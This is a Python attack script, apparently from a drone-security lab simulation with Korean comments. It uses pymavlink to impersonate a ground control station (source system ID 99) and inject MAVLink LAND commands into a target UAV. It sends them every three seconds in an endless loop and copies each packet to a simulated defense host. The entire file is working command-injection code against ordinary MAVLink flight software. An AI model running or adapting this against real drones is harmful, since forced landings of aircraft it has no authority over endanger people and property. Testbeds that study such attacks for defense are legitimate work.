import time
from pymavlink import mavutil

# ─────────────────────────────────────────
# 공격 대상 설정 (recon이 알아낸 정보)
# ─────────────────────────────────────────
TARGET_HOST    = '172.20.0.10'   # UAV 컨테이너 IP
DEFENSE_HOST   = '172.20.0.60'   # 방어 에이전트 IP (감시 당하는 척)
TARGET_PORT    = 14551           # 명령 수신 포트
SYS_ID         = 1               # recon에서 파악한 드론 SYS_ID
ATTACKER_SYS_ID = 99             # 공격자 SYS_ID (GCS인 척)


def inject_land(mav, host):
    # COMMAND_LONG 패킷으로 LAND 명령 주입
    mav.mav.command_long_send(
        target_system=SYS_ID,                          # 타깃 드론 번호
        target_component=1,
        command=mavutil.mavlink.MAV_CMD_NAV_LAND,      # 착륙 명령
        confirmation=0,
        param1=0, param2=0, param3=0, param4=0,
        param5=0, param6=0, param7=0
    )
    print(f"[EXECUTOR] ⚠️  LAND 명령 주입 완료 → SYS_ID={SYS_ID} | {host}:{TARGET_PORT}")


def main():
    print(f"[EXECUTOR] 공격 에이전트 시작")
    print(f"[EXECUTOR] 타깃: 송골매 SYS_ID={SYS_ID}")
    print(f"[EXECUTOR] 공격자 위장 SYS_ID={ATTACKER_SYS_ID} (GCS인 척)")
    print("-" * 50)

    # UAV로 직접 공격 명령 전송
    mav_uav = mavutil.mavlink_connection(
        f'udpout:{TARGET_HOST}:{TARGET_PORT}',
        source_system=ATTACKER_SYS_ID
    )

    # defense도 같은 패킷 수신 (네트워크 감시 시뮬레이션)
    mav_def = mavutil.mavlink_connection(
        f'udpout:{DEFENSE_HOST}:{TARGET_PORT}',
        source_system=ATTACKER_SYS_ID
    )

    print(f"[EXECUTOR] UAV 준비 대기 중...")
    time.sleep(3)

    count = 1
    while True:
        print(f"[EXECUTOR] 공격 {count}회차 시도")

        # UAV + defense 둘 다 전송
        inject_land(mav_uav, TARGET_HOST)
        inject_land(mav_def, DEFENSE_HOST)

        count += 1
        time.sleep(3)


if __name__ == '__main__':
    main()